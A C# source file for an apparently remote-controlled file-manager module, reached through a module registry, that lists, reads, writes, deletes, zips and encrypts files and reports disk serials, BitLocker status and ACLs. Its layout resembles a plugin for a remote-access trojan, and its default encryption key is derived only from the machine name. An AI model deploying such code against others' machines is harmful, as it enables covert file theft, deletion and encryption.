using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace mullvad.Module.FileManager
{
    public sealed class FileManagerClientModule
    {
        public static string ModuleId => "mullvad.filemanager";

        // Entry point called via reflection by the client module registry.
        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "getdrives":   return GetDrives();
                    case "list":        return List(payload);
                    case "read":        return ReadFile(payload);
                    case "read_chunk":  return ReadChunk(payload);
                    case "write":       return WriteFile(payload);
                    case "write_chunk": return WriteChunk(payload);
                    case "delete":      return Delete(payload);
                    case "mkdir":       return MakeDir(payload);
                    case "move":        return Move(payload);
                    case "zip":         return ZipFiles(payload);
                    case "disk_info":           return GetDiskInfo(payload);
                    case "disk_info_advanced":  return GetDiskInfoAdvanced(payload);
                    case "storage_usage":       return GetStorageUsage(payload);
                    case "encryption_status":   return GetEncryptionStatus(payload);
                    case "acl_view":            return GetAcl(payload);
                    case "acl_owner":           return GetAclOwner(payload);
                    case "acl_export":          return ExportAcl(payload);
                    case "encrypt":     return CryptPaths(payload, null, encrypt: true);
                    case "encrypt_pw":  return CryptPathsPw(payload, encrypt: true);
                    case "decrypt":     return CryptPaths(payload, null, encrypt: false);
                    case "decrypt_pw":  return CryptPathsPw(payload, encrypt: false);
                    default:            return Err("Unknown action: " + action);
                }
            }
            catch (Exception ex)
            {
                return Err(ex.Message);
            }
        }

        // ── getdrives ─────────────────────────────────────────────────────────
        // Returns: [{name, label, format, available_gb, total_gb, drive_type}]
        private static string GetDrives()
        {
            var sb = new StringBuilder("[");
            bool first = true;
            foreach (var d in DriveInfo.GetDrives())
            {
                string label = "", format = "", avail = "0.0", total = "0.0";
                try { label  = d.VolumeLabel;  } catch { }
                try { format = d.DriveFormat;  } catch { }
                try { avail  = (d.AvailableFreeSpace / 1073741824.0).ToString("F1"); } catch { }
                try { total  = (d.TotalSize          / 1073741824.0).ToString("F1"); } catch { }

                if (!first) sb.Append(',');
                first = false;
                sb.Append("{");
                sb.Append("\"name\":")     .Append(Json(d.Name));
                sb.Append(",\"label\":")   .Append(Json(label));
                sb.Append(",\"format\":") .Append(Json(format));
                sb.Append(",\"avail_gb\":").Append(avail);
                sb.Append(",\"total_gb\":").Append(total);
                sb.Append(",\"type\":")   .Append(Json(d.DriveType.ToString()));
                sb.Append(",\"ready\":")  .Append(d.IsReady ? "true" : "false");
                sb.Append("}");
            }
            sb.Append("]");
            return sb.ToString();
        }

        // ── list ─────────────────────────────────────────────────────────────
        // payload: directory path (or empty = list drives)
        // Returns: {path, entries:[{name, is_dir, size, modified}]}
        private static string List(string path)
        {
            if (string.IsNullOrEmpty(path))
                return GetDrives();

            var sb = new StringBuilder("{");
            sb.Append("\"path\":").Append(Json(path));
            sb.Append(",\"entries\":[");

            bool first = true;
            var dir = new DirectoryInfo(path);

            DirectoryInfo[] dirs;
            try { dirs = dir.GetDirectories(); } catch { dirs = new DirectoryInfo[0]; }

            foreach (var sub in dirs)
            {
                try
                {
                    string mod;
                    try { mod = sub.LastWriteTimeUtc.ToString("yyyy-MM-dd HH:mm:ss"); } catch { mod = ""; }
                    if (!first) sb.Append(',');
                    first = false;
                    sb.Append("{");
                    sb.Append("\"name\":")    .Append(Json(sub.Name));
                    sb.Append(",\"is_dir\":true");
                    sb.Append(",\"size\":0");
                    sb.Append(",\"modified\":").Append(Json(mod));
                    sb.Append("}");
                }
                catch { }
            }

            FileInfo[] files;
            try { files = dir.GetFiles(); } catch { files = new FileInfo[0]; }

            foreach (var fi in files)
            {
                try
                {
                    string mod;
                    try { mod = fi.LastWriteTimeUtc.ToString("yyyy-MM-dd HH:mm:ss"); } catch { mod = ""; }
                    if (!first) sb.Append(',');
                    first = false;
                    sb.Append("{");
                    sb.Append("\"name\":")    .Append(Json(fi.Name));
                    sb.Append(",\"is_dir\":false");
                    sb.Append(",\"size\":")  .Append(fi.Length);
                    sb.Append(",\"modified\":").Append(Json(mod));
                    sb.Append("}");
                }
                catch { }
            }

            sb.Append("]}");
            return sb.ToString();
        }

        // ── read ──────────────────────────────────────────────────────────────
        // payload: file path
        // Returns: {data (base64), size}
        private static string ReadFile(string filePath)
        {
            var bytes = File.ReadAllBytes(filePath);
            return "{\"data\":\"" + Convert.ToBase64String(bytes)
                   + "\",\"size\":" + bytes.Length + "}";
        }

        // ── read_chunk ────────────────────────────────────────────────────────
        // payload: {path, offset, length}
        // Returns: {data (base64), total, done}
        private static string ReadChunk(string payload)
        {
            var doc    = SimpleJson.Parse(payload);
            var path   = doc.ContainsKey("path")   ? doc["path"]   : "";
            long offset = doc.ContainsKey("offset") && long.TryParse(doc["offset"], out var o) ? o : 0L;
            int  length = doc.ContainsKey("length") && int.TryParse(doc["length"], out var l)  ? l : 2 * 1024 * 1024;

            long total;
            byte[] buf;
            int read;
            using (var fs = File.OpenRead(path))
            {
                total = fs.Length;
                fs.Seek(offset, SeekOrigin.Begin);
                int toRead = (int)Math.Min(length, total - offset);
                buf  = new byte[toRead];
                read = 0;
                while (read < toRead)
                {
                    int n = fs.Read(buf, read, toRead - read);
                    if (n == 0) break;
                    read += n;
                }
            }
            if (read < buf.Length) Array.Resize(ref buf, read);
            bool done = offset + read >= total;
            return "{\"data\":\"" + Convert.ToBase64String(buf)
                 + "\",\"total\":" + total
                 + ",\"done\":"    + (done ? "true" : "false") + "}";
        }

        // ── write ─────────────────────────────────────────────────────────────
        // payload: JSON {path, data (base64)}
        // Returns: {success, error}
        private static string WriteFile(string payload)
        {
            var doc  = SimpleJson.Parse(payload);
            var path = doc["path"];
            var data = Convert.FromBase64String(doc["data"]);
            var dir  = Path.GetDirectoryName(path);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                Directory.CreateDirectory(dir);
            File.WriteAllBytes(path, data);
            return "{\"success\":true}";
        }

        // ── write_chunk ────────────────────────────────────────────────────────
        // payload: JSON {path, offset, data (base64), done}
        // Opens in append/create mode at offset; if offset==0 truncates first.
        // Returns: {success, written}
        private static string WriteChunk(string payload)
        {
            var doc    = SimpleJson.Parse(payload);
            var path   = doc.ContainsKey("path")   ? doc["path"]   : "";
            long offset = doc.ContainsKey("offset") && long.TryParse(doc["offset"], out var o) ? o : 0L;
            var data   = doc.ContainsKey("data")   ? Convert.FromBase64String(doc["data"]) : Array.Empty<byte>();
            var dir    = Path.GetDirectoryName(path);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                Directory.CreateDirectory(dir);

            using var fs = new FileStream(path,
                offset == 0 ? FileMode.Create : FileMode.OpenOrCreate,
                FileAccess.Write, FileShare.None);
            fs.Seek(offset, SeekOrigin.Begin);
            fs.Write(data, 0, data.Length);
            return "{\"success\":true,\"written\":" + data.Length + "}";
        }

        // ── delete ────────────────────────────────────────────────────────────
        // payload: path (file or empty directory)
        private static string Delete(string path)
        {
            if (Directory.Exists(path))
                Directory.Delete(path, recursive: true);
            else
                File.Delete(path);
            return "{\"success\":true}";
        }

        // ── mkdir ──────────────────────────────────────────────────────────────
        // payload: new directory path
        private static string MakeDir(string path)
        {
            Directory.CreateDirectory(path);
            return "{\"success\":true}";
        }

        // ── move ───────────────────────────────────────────────────────────────
        // payload: JSON {src, dst}
        private static string Move(string payload)
        {
            var doc = SimpleJson.Parse(payload);
            var src = doc["src"];
            var dst = doc["dst"];
            if (Directory.Exists(src))
                Directory.Move(src, dst);
            else
                File.Move(src, dst);
            return "{\"success\":true}";
        }

        // ── zip ────────────────────────────────────────────────────────────────
        // payload: JSON {dest, paths} where paths is \n-delimited list of paths
        private static string ZipFiles(string payload)
        {
            var doc   = SimpleJson.Parse(payload);
            var dest  = doc.ContainsKey("dest")  ? doc["dest"]  : "";
            var paths = doc.ContainsKey("paths") ? doc["paths"] : "";
            if (string.IsNullOrEmpty(dest))
                return Err("No destination specified");

            var entries = paths.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
            if (entries.Length == 0)
                return Err("No paths specified");

            if (File.Exists(dest)) File.Delete(dest);

            using (var zip = ZipFile.Open(dest, ZipArchiveMode.Create))
            {
                foreach (var entry in entries)
                {
                    var p = entry.Trim();
                    if (string.IsNullOrEmpty(p)) continue;
                    try
                    {
                        if (Directory.Exists(p))
                        {
                            AddDirectory(zip, p, Path.GetFileName(p));
                        }
                        else if (File.Exists(p))
                        {
                            zip.CreateEntryFromFile(p, Path.GetFileName(p), CompressionLevel.Optimal);
                        }
                    }
                    catch { }
                }
            }
            return "{\"success\":true}";
        }

        private static void AddDirectory(ZipArchive zip, string dirPath, string entryBase)
        {
            foreach (var file in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
            {
                try
                {
                    var rel = file.Substring(dirPath.Length).TrimStart('\\', '/');
                    zip.CreateEntryFromFile(file, entryBase + "\\" + rel, CompressionLevel.Optimal);
                }
                catch { }
            }
        }

        // ── Disk Information ──────────────────────────────────────────────────

        private static string GetDiskInfo(string path)
        {
            var letter = path.Length > 0 ? path[0].ToString().ToUpper() + ":" : path;
            var sb = new StringBuilder();
            sb.AppendLine($"=== Disk Information: {letter} ===\n");
            try
            {
                var d = new DriveInfo(letter);
                sb.AppendLine($"Drive:              {d.Name}");
                sb.AppendLine($"Label:              {Safely(() => d.VolumeLabel)}");
                sb.AppendLine($"File System:        {Safely(() => d.DriveFormat)}");
                sb.AppendLine($"Type:               {d.DriveType}");
                sb.AppendLine($"Ready:              {d.IsReady}");
                if (d.IsReady)
                {
                    long total = d.TotalSize;
                    long free  = d.AvailableFreeSpace;
                    long used  = total - free;
                    double pct = total > 0 ? used * 100.0 / total : 0;
                    sb.AppendLine();
                    sb.AppendLine($"Total Size:         {FmtBytes(total)}  ({total:N0} bytes)");
                    sb.AppendLine($"Used Space:         {FmtBytes(used)}  ({pct:F1}%)");
                    sb.AppendLine($"Free Space:         {FmtBytes(free)}  ({100 - pct:F1}%)");
                    sb.AppendLine($"Total Free:         {FmtBytes(d.TotalFreeSpace)}");
                    sb.AppendLine();
                    int barW = 36, filled = (int)(pct / 100.0 * barW);
                    sb.AppendLine($"[{new string('\u2588', filled)}{new string('\u2591', barW - filled)}] {pct:F1}%");
                }
            }
            catch (Exception ex) { sb.AppendLine($"Error: {ex.Message}"); }
            return TextResult(sb.ToString().TrimEnd());
        }

        private static string GetDiskInfoAdvanced(string path)
        {
            var letter = path.Length > 0 ? path[0].ToString().ToUpper() + ":" : path;
            var sb = new StringBuilder();
            sb.AppendLine($"=== Advanced Disk Information: {letter} ===\n");
            try
            {
                using (var s = new ManagementObjectSearcher(
                    $"SELECT * FROM Win32_LogicalDisk WHERE DeviceID='{letter}'"))
                foreach (ManagementObject o in s.Get())
                {
                    sb.AppendLine($"Device ID:          {o["DeviceID"]}");
                    sb.AppendLine($"Volume Name:        {o["VolumeName"]}");
                    sb.AppendLine($"Volume Serial:      {o["VolumeSerialNumber"]}");
                    sb.AppendLine($"File System:        {o["FileSystem"]}");
                    sb.AppendLine($"Description:        {o["Description"]}");
                    long sz  = o["Size"]      != null ? (long)(ulong)o["Size"]      : 0;
                    long fr  = o["FreeSpace"] != null ? (long)(ulong)o["FreeSpace"] : 0;
                    sb.AppendLine($"Total Size:         {FmtBytes(sz)}  ({sz:N0} bytes)");
                    sb.AppendLine($"Free Space:         {FmtBytes(fr)}  ({fr:N0} bytes)");
                    sb.AppendLine($"Used Space:         {FmtBytes(sz - fr)}");
                    sb.AppendLine($"Compressed:         {o["Compressed"]}");
                    sb.AppendLine($"Quota Support:      {o["SupportsDiskQuotas"]}");
                }
            }
            catch (Exception ex) { sb.AppendLine($"Logical disk info: {ex.Message}"); }
            try
            {
                var letter2 = letter.Replace("\\", "\\\\");
                using var as1 = new ManagementObjectSearcher(
                    $"ASSOCIATORS OF {{Win32_LogicalDisk.DeviceID='{letter}'}} WHERE AssocClass=Win32_LogicalDiskToPartition");
                foreach (ManagementObject part in as1.Get())
                {
                    using var as2 = new ManagementObjectSearcher(
                        $"ASSOCIATORS OF {{Win32_DiskPartition.DeviceID='{part["DeviceID"]}'}} WHERE AssocClass=Win32_DiskDriveToDiskPartition");
                    foreach (ManagementObject disk in as2.Get())
                    {
                        sb.AppendLine();
                        sb.AppendLine("=== Physical Disk ===");
                        sb.AppendLine($"Model:              {disk["Model"]}");
                        sb.AppendLine($"Manufacturer:       {disk["Manufacturer"]}");
                        sb.AppendLine($"Serial Number:      {(disk["SerialNumber"]?.ToString() ?? "N/A").Trim()}");
                        sb.AppendLine($"Interface:          {disk["InterfaceType"]}");
                        sb.AppendLine($"Media Type:         {disk["MediaType"]}");
                        sb.AppendLine($"Firmware:           {disk["FirmwareRevision"]}");
                        long dsz = disk["Size"] != null ? (long)(ulong)disk["Size"] : 0;
                        sb.AppendLine($"Disk Size:          {FmtBytes(dsz)}");
                        sb.AppendLine($"Partitions:         {disk["Partitions"]}");
                    }
                }
            }
            catch (Exception ex) { sb.AppendLine($"\nPhysical disk info: {ex.Message}"); }
            return TextResult(sb.ToString().TrimEnd());
        }

        private static string GetStorageUsage(string path)
        {
            var letter = path.Length > 0 ? path[0].ToString().ToUpper() + ":" : path;
            var sb = new StringBuilder();
            sb.AppendLine($"=== Storage Usage: {letter} ===\n");
            try
            {
                var d = new DriveInfo(letter);
                if (!d.IsReady) return ErrResult("Drive is not ready.");
                long total = d.TotalSize, free = d.AvailableFreeSpace, used = total - free;
                double pct = total > 0 ? used * 100.0 / total : 0;
                int barW = 40, filled = (int)(pct / 100.0 * barW);
                sb.AppendLine($"Volume:             {d.Name}");
                sb.AppendLine($"Label:              {Safely(() => d.VolumeLabel)}");
                sb.AppendLine();
                sb.AppendLine($"[{new string('\u2588', filled)}{new string('\u2591', barW - filled)}]");
                sb.AppendLine($"  {pct:F1}% Used   {100 - pct:F1}% Free");
                sb.AppendLine();
                sb.AppendLine($"Total:              {FmtBytes(total)}");
                sb.AppendLine($"Used:               {FmtBytes(used)}");
                sb.AppendLine($"Available:          {FmtBytes(free)}");
                sb.AppendLine($"Total Free:         {FmtBytes(d.TotalFreeSpace)}");
                sb.AppendLine();
                sb.AppendLine($"Total (bytes):      {total:N0}");
                sb.AppendLine($"Used  (bytes):      {used:N0}");
                sb.AppendLine($"Free  (bytes):      {free:N0}");
            }
            catch (Exception ex) { sb.AppendLine($"Error: {ex.Message}"); }
            return TextResult(sb.ToString().TrimEnd());
        }

        private static string GetEncryptionStatus(string path)
        {
            var letter = path.Length > 0 ? path[0].ToString().ToUpper() + ":" : path;
            var sb = new StringBuilder();
            sb.AppendLine($"=== Encryption Status: {letter} ===\n");
            try
            {
                using var s = new ManagementObjectSearcher(
                    new ManagementScope(@"\\.\root\CIMV2\Security\MicrosoftVolumeEncryption"),
                    new ObjectQuery($"SELECT * FROM Win32_EncryptableVolume WHERE DriveLetter='{letter}'"));
                bool found = false;
                foreach (ManagementObject v in s.Get())
                {
                    found = true;
                    uint prot = (uint)v["ProtectionStatus"];
                    uint conv = (uint)v["ConversionStatus"];
                    sb.AppendLine($"Drive:              {v["DriveLetter"]}");
                    sb.AppendLine($"BitLocker Status:   {(prot == 1 ? "Protected (ON)" : prot == 0 ? "Unprotected (OFF)" : "Unknown")}");
                    sb.AppendLine($"Encryption State:   {EncConvStr(conv)}");
                    sb.AppendLine($"Protection Status:  {prot}");
                }
                if (!found)
                    sb.AppendLine("BitLocker is not configured on this volume.\n" +
                                  "The volume may not support encryption or BitLocker is unavailable.");
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Unable to query BitLocker status:\n{ex.Message}");
                sb.AppendLine("\nNote: Requires admin rights and BitLocker WMI provider.");
            }
            return TextResult(sb.ToString().TrimEnd());
        }

        private static string EncConvStr(uint s)
        {
            switch (s)
            {
                case 0: return "Fully Decrypted";
                case 1: return "Fully Encrypted";
                case 2: return "Encryption In Progress";
                case 3: return "Decryption In Progress";
                case 4: return "Encryption Paused";
                case 5: return "Decryption Paused";
                default: return $"Unknown ({s})";
            }
        }

        // ── ACL / Permissions ──────────────────────────────────────────────────

        private static string GetAcl(string path)
        {
            var root = Path.GetPathRoot(path.TrimEnd('\\', '/')) ?? path;
            var sb = new StringBuilder();
            sb.AppendLine($"=== Access Control List: {root} ===\n");
            try
            {
                var sec   = Directory.GetAccessControl(root);
                var rules = sec.GetAccessRules(true, true, typeof(NTAccount));
                int i = 1;
                foreach (FileSystemAccessRule r in rules)
                {
                    sb.AppendLine($"Entry {i++}:");
                    sb.AppendLine($"  Identity:    {r.IdentityReference.Value}");
                    sb.AppendLine($"  Rights:      {r.FileSystemRights}");
                    sb.AppendLine($"  Type:        {r.AccessControlType}");
                    sb.AppendLine($"  Inherited:   {r.IsInherited}");
                    sb.AppendLine($"  Propagation: {r.PropagationFlags}");
                    sb.AppendLine();
                }
            }
            catch (Exception ex) { sb.AppendLine($"Error: {ex.Message}"); }
            return TextResult(sb.ToString().TrimEnd());
        }

        private static string GetAclOwner(string path)
        {
            var root = Path.GetPathRoot(path.TrimEnd('\\', '/')) ?? path;
            var sb = new StringBuilder();
            sb.AppendLine($"=== Owner Information: {root} ===\n");
            try
            {
                var sec    = Directory.GetAccessControl(root);
                var owner  = sec.GetOwner(typeof(NTAccount));
                var sid    = sec.GetOwner(typeof(SecurityIdentifier));
                sb.AppendLine($"Owner:          {owner?.Value ?? "Unknown"}");
                sb.AppendLine($"SID:            {sid?.Value   ?? "Unknown"}");
                sb.AppendLine($"Path:           {root}");
            }
            catch (Exception ex) { sb.AppendLine($"Error: {ex.Message}"); }
            return TextResult(sb.ToString().TrimEnd());
        }

        private static string ExportAcl(string path)
        {
            var root = Path.GetPathRoot(path.TrimEnd('\\', '/')) ?? path;
            var sb = new StringBuilder();
            sb.AppendLine($"=== Full ACL Export: {root} ===");
            sb.AppendLine($"Exported:   {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            sb.AppendLine();
            try
            {
                var sec   = Directory.GetAccessControl(root);
                var owner = sec.GetOwner(typeof(NTAccount));
                sb.AppendLine("[Owner]");
                sb.AppendLine($"  {owner?.Value ?? "Unknown"}");
                sb.AppendLine();
                var rules = sec.GetAccessRules(true, true, typeof(NTAccount));
                sb.AppendLine($"[Access Rules]  ({rules.Count} entries)");
                int i = 1;
                foreach (FileSystemAccessRule r in rules)
                {
                    sb.AppendLine($"\n  --- Entry {i++} ---");
                    sb.AppendLine($"  Account:       {r.IdentityReference.Value}");
                    sb.AppendLine($"  Rights:        {r.FileSystemRights}");
                    sb.AppendLine($"  Type:          {r.AccessControlType}");
                    sb.AppendLine($"  Inherited:     {r.IsInherited}");
                    sb.AppendLine($"  Inherit Flags: {r.InheritanceFlags}");
                    sb.AppendLine($"  Propagation:   {r.PropagationFlags}");
                }
                var outPath = Path.Combine(
                    Path.GetTempPath(),
                    $"acl_{root[0]}_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
                File.WriteAllText(outPath, sb.ToString());
                sb.Insert(0, $"Saved to: {outPath}\n\n");
            }
            catch (Exception ex) { return ErrResult("Error exporting ACL: " + ex.Message); }
            return TextResult(sb.ToString().TrimEnd());
        }

        private static string Safely(Func<string> fn) { try { return fn() ?? "N/A"; } catch { return "N/A"; } }
        private static string TextResult(string t) => "{\"text\":" + Json(t) + "}";
        private static string ErrResult(string m)  => "{\"error\":" + Json(m) + "}";
        private static string FmtBytes(long b)
        {
            if (b < 1024)           return $"{b} B";
            if (b < 1048576)        return $"{b / 1024.0:F2} KB";
            if (b < 1073741824)     return $"{b / 1048576.0:F2} MB";
            if (b < 1099511627776L) return $"{b / 1073741824.0:F2} GB";
            return $"{b / 1099511627776.0:F2} TB";
        }

        // ── Encryption / Decryption ───────────────────────────────────────────
        // File format: [4-byte magic "MLVE"][1-byte flags (0=internal,1=pw)][16-byte salt][16-byte IV][ciphertext]
        // Internal key: PBKDF2-SHA1(MachineName, salt, 10000 iterations, 32 bytes)
        // Password key: PBKDF2-SHA1(password, salt, 10000 iterations, 32 bytes)

        private static readonly byte[] EncMagic = { (byte)'M', (byte)'L', (byte)'V', (byte)'E' };

        private static string CryptPaths(string pathsNewline, string password, bool encrypt)
        {
            var passphrase = password ?? Environment.MachineName;
            byte flags = (byte)(password == null ? 0 : 1);
            int ok = 0;
            var errors = new List<string>();
            foreach (var raw in pathsNewline.Split('\n'))
            {
                var p = raw.Trim();
                if (string.IsNullOrEmpty(p)) continue;
                try
                {
                    if (encrypt) EncryptFile(p, passphrase, flags);
                    else         DecryptFile(p, passphrase);
                    ok++;
                }
                catch (Exception ex) { errors.Add("[" + Json(p) + "," + Json(ex.Message) + "]"); }
            }
            return "{\"ok\":" + ok + ",\"errors\":[" + string.Join(",", errors) + "]}";
        }

        private static string CryptPathsPw(string payload, bool encrypt)
        {
            var doc      = SimpleJson.Parse(payload);
            var paths    = doc.ContainsKey("paths")    ? doc["paths"]    : "";
            var password = doc.ContainsKey("password") ? doc["password"] : "";
            if (string.IsNullOrEmpty(password)) return Err("No password provided");
            return CryptPaths(paths, password, encrypt);
        }

        private static void EncryptFile(string path, string passphrase, byte flags)
        {
            var data = File.ReadAllBytes(path);
            var salt = new byte[16];
            var iv   = new byte[16];
            using (var rng = RandomNumberGenerator.Create()) { rng.GetBytes(salt); rng.GetBytes(iv); }
            var key = DeriveKey(passphrase, salt);

            byte[] cipher;
            using (var aes = Aes.Create())
            {
                aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                using var enc = aes.CreateEncryptor();
                cipher = enc.TransformFinalBlock(data, 0, data.Length);
            }

            using var ms = new MemoryStream();
            ms.Write(EncMagic, 0, 4);
            ms.WriteByte(flags);
            ms.Write(salt, 0, 16);
            ms.Write(iv,   0, 16);
            ms.Write(cipher, 0, cipher.Length);
            File.WriteAllBytes(path + ".enc", ms.ToArray());
        }

        private static void DecryptFile(string path, string passphrase)
        {
            var raw = File.ReadAllBytes(path);
            if (raw.Length < 37) throw new Exception("Not a valid encrypted file");
            for (int i = 0; i < 4; i++)
                if (raw[i] != EncMagic[i]) throw new Exception("Invalid file header");

            var salt   = new byte[16]; Array.Copy(raw, 5,  salt, 0, 16);
            var iv     = new byte[16]; Array.Copy(raw, 21, iv,   0, 16);
            var cipher = new byte[raw.Length - 37]; Array.Copy(raw, 37, cipher, 0, cipher.Length);

            var key = DeriveKey(passphrase, salt);
            byte[] plain;
            using (var aes = Aes.Create())
            {
                aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                using var dec = aes.CreateDecryptor();
                plain = dec.TransformFinalBlock(cipher, 0, cipher.Length);
            }

            var outPath = path.EndsWith(".enc", StringComparison.OrdinalIgnoreCase)
                ? path.Substring(0, path.Length - 4)
                : path + ".dec";
            File.WriteAllBytes(outPath, plain);
        }

        private static byte[] DeriveKey(string passphrase, byte[] salt)
        {
            using var kdf = new Rfc2898DeriveBytes(passphrase, salt, 10000);
            return kdf.GetBytes(32);
        }

        // ── Helpers ────────────────────────────────────────────────────────────

        private static string Err(string msg)
            => "{\"success\":false,\"error\":\"" + msg.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", " ") + "\"}";

        private static string Json(string s)
        {
            if (s == null) return "null";
            return "\"" + s.Replace("\\", "\\\\").Replace("\"", "\\\"")
                           .Replace("\r", "\\r").Replace("\n", "\\n")
                           .Replace("\t", "\\t") + "\"";
        }
    }

    // Minimal JSON key-value reader (no external dependency required)
    internal static class SimpleJson
    {
        internal static Dictionary<string, string> Parse(string json)
        {
            var result = new Dictionary<string, string>(StringComparer.Ordinal);
            if (string.IsNullOrWhiteSpace(json)) return result;
            json = json.Trim();
            if (json.StartsWith("{")) json = json.Substring(1, json.Length - 2);

            int i = 0;
            while (i < json.Length)
            {
                // skip whitespace and commas
                while (i < json.Length && (json[i] == ',' || json[i] == ' ' || json[i] == '\r' || json[i] == '\n' || json[i] == '\t')) i++;
                if (i >= json.Length) break;

                // read key
                var key   = ReadString(json, ref i);
                // skip colon
                while (i < json.Length && (json[i] == ':' || json[i] == ' ')) i++;
                // read value
                var value = ReadValue(json, ref i);
                if (key != null && value != null)
                    result[key] = value;
            }
            return result;
        }

        private static string? ReadString(string s, ref int i)
        {
            if (i >= s.Length || s[i] != '"') return null;
            i++;
            var sb = new StringBuilder();
            while (i < s.Length && s[i] != '"')
            {
                if (s[i] == '\\' && i + 1 < s.Length)
                {
                    i++;
                    switch (s[i])
                    {
                        case '"':  sb.Append('"');  break;
                        case '\\': sb.Append('\\'); break;
                        case 'n':  sb.Append('\n'); break;
                        case 'r':  sb.Append('\r'); break;
                        default:   sb.Append(s[i]); break;
                    }
                }
                else sb.Append(s[i]);
                i++;
            }
            if (i < s.Length) i++; // skip closing "
            return sb.ToString();
        }

        private static string? ReadValue(string s, ref int i)
        {
            if (i >= s.Length) return null;
            if (s[i] == '"') return ReadString(s, ref i);
            // read until comma or }
            var start = i;
            while (i < s.Length && s[i] != ',' && s[i] != '}') i++;
            return s.Substring(start, i - start).Trim();
        }
    }
}
